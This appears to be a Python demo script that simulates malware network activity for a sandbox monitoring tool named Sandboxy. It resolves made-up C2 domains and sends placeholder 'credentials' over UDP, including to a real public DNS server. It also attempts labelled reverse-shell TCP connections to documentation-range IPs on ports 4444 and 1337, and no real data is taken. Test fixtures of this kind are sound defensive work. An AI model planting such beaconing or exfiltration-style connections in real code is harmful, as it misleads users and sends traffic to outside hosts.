#!/usr/bin/env python3
import socket
import urllib.request
import time
import sys

print("======================================================================")
print("             SIMULATED MALWARE NETWORK BEHAVIOR DEMO                  ")
print("======================================================================")
print("This script simulates typical steps malware performs when requesting C2")
print("servers, downloading payloads, exfiltrating data, and checking connectivity.")
print("It is designed to run inside Sandboxy for monitoring visualization.")
print("======================================================================")
sys.stdout.flush()

# 1. DNS Resolution attempts (simulates host lookups for infrastructure)
print("\n[Phase 1] Simulating DNS lookups for Command & Control servers...")
domains = [
    "c2-server.malicious-domain.xyz",
    "payload-downloader.infra-server.net",
    "data-exfiltration-db.org",
    "api.telegram.org",
    "pastebin.com",
    "github.com",
    "neverssl.com"
]
for domain in domains:
    print(f"  --> Looking up host: {domain}")
    sys.stdout.flush()
    try:
        socket.gethostbyname(domain)
    except Exception:
        # We ignore errors since sandbox might be offline, but the DNS request is still sent and captured!
        pass
    time.sleep(1.2)

# 2. HTTP Request (simulates check for plain text updates or initial connectivity)
print("\n[Phase 2] Simulating HTTP request (Initial connectivity check)...")
print("  --> Requesting: http://neverssl.com")
sys.stdout.flush()
try:
    urllib.request.urlopen("http://neverssl.com", timeout=2)
except Exception:
    pass
time.sleep(1.2)

# 3. HTTPS / TLS Requests (simulates API communication and payload fetching)
print("\n[Phase 3] Simulating HTTPS C2 communication (Telegram Bot & Pastebin payloads)...")
urls = [
    "https://github.com",
    "https://api.telegram.org",
    "https://pastebin.com"
]
for url in urls:
    print(f"  --> Contacting secure server: {url}")
    sys.stdout.flush()
    try:
        urllib.request.urlopen(url, timeout=2)
    except Exception:
        pass
    time.sleep(1.2)

# 4. Raw TCP Connection attempts (simulates Reverse Shell attempts to external attackers)
print("\n[Phase 4] Simulating TCP Reverse Shell attempts to remote IPs on custom ports...")
targets = [
    ("198.51.100.42", 4444),
    ("203.0.113.88", 1337)
]
for ip, port in targets:
    print(f"  --> Attempting raw TCP connection to {ip}:{port}...")
    sys.stdout.flush()
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1.5)
        s.connect((ip, port))
        s.close()
    except Exception:
        pass
    time.sleep(1.2)

# 5. UDP Raw packets (simulates DNS tunneling exfiltration or heartbeat beaconing)
print("\n[Phase 5] Simulating UDP DNS Tunneling / Beacon exfiltration...")
udp_targets = [
    ("198.51.100.42", 53),
    ("8.8.8.8", 9999)
]
for ip, port in udp_targets:
    print(f"  --> Sending UDP exfiltration bytes to {ip}:{port}...")
    sys.stdout.flush()
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(b"\x00\x01SimulatedExfiltratedSystemCredentialsDataHere\x00", (ip, port))
        s.close()
    except Exception:
        pass
    time.sleep(1.2)

print("\n======================================================================")
print("[+] Simulated malware behavior demo script finished.")
print("======================================================================")
sys.stdout.flush()
